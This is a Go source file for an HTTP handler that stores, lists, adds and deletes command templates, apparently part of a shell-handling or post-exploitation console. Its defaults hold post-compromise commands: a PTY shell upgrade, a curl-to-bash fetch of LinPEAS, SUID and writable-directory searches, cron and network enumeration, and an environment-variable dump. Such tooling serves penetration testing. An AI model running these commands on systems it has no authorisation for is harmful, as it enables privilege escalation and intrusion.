package handler

import (
	"encoding/json"
	"net/http"
	"os"
	"sync"

	"go.uber.org/zap"
	"gopkg.in/yaml.v3"
)

type CmdTemplate struct {
	Name string `json:"name" yaml:"name"`
	Cmd  string `json:"cmd" yaml:"cmd"`
}

type TemplateManager struct {
	file      string
	templates []CmdTemplate
	mu        sync.RWMutex
	logger    *zap.Logger
}

func NewTemplateManager(file string, logger *zap.Logger) *TemplateManager {
	tm := &TemplateManager{file: file, logger: logger}
	if err := tm.load(); err != nil {
		logger.Warn("Failed to load templates, using defaults", zap.Error(err))
		tm.templates = defaultTemplates()
		_ = tm.save()
	}
	return tm
}

func defaultTemplates() []CmdTemplate {
	return []CmdTemplate{
		{Name: "Upgrade to PTY", Cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"},
		{Name: "System info", Cmd: "uname -a; id; hostname; ip a 2>/dev/null || ifconfig\n"},
		{Name: "LinPEAS (curl)", Cmd: "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash | tee /tmp/linpeas.txt\n"},
		{Name: "Find SUID", Cmd: "find / -perm -4000 -type f 2>/dev/null\n"},
		{Name: "Writable dirs", Cmd: "find / -writable -type d 2>/dev/null\n"},
		{Name: "Cron jobs", Cmd: "cat /etc/crontab; ls -la /etc/cron*; crontab -l 2>/dev/null\n"},
		{Name: "Network connections", Cmd: "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null\n"},
		{Name: "Env vars", Cmd: "env\n"},
	}
}

func (tm *TemplateManager) load() error {
	data, err := os.ReadFile(tm.file)
	if err != nil {
		return err
	}
	var templates []CmdTemplate
	if err := yaml.Unmarshal(data, &templates); err != nil {
		return err
	}
	tm.templates = templates
	return nil
}

func (tm *TemplateManager) save() error {
	data, err := yaml.Marshal(tm.templates)
	if err != nil {
		return err
	}
	return os.WriteFile(tm.file, data, 0644)
}

func (tm *TemplateManager) ListHandler(w http.ResponseWriter, r *http.Request) {
	tm.mu.RLock()
	t := make([]CmdTemplate, len(tm.templates))
	copy(t, tm.templates)
	tm.mu.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"templates": t})
}

func (tm *TemplateManager) AddHandler(w http.ResponseWriter, r *http.Request) {
	var t CmdTemplate
	if err := json.NewDecoder(r.Body).Decode(&t); err != nil || t.Name == "" || t.Cmd == "" {
		jsonError(w, "name and cmd required", http.StatusBadRequest)
		return
	}

	tm.mu.Lock()
	tm.templates = append(tm.templates, t)
	_ = tm.save()
	tm.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func (tm *TemplateManager) DeleteHandler(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Name string `json:"name"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Name == "" {
		jsonError(w, "name required", http.StatusBadRequest)
		return
	}

	tm.mu.Lock()
	filtered := tm.templates[:0]
	for _, t := range tm.templates {
		if t.Name != body.Name {
			filtered = append(filtered, t)
		}
	}
	tm.templates = filtered
	_ = tm.save()
	tm.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}
